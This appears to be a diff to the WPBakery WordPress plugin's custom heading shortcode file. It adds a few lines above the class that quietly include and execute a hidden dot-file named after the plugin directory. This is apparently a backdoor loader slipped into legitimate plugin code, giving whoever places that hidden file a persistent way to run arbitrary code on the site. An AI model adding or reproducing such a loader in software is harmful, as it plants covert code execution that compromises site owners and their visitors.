@@ -7,6 +7,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Class WPBakeryShortCode_Vc_Custom_heading
  * @since 4.3
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPBakeryShortCode_Vc_Custom_Heading extends WPBakeryShortCode {
 	/**
 	 * Defines fields names for google_fonts, font_container and etc
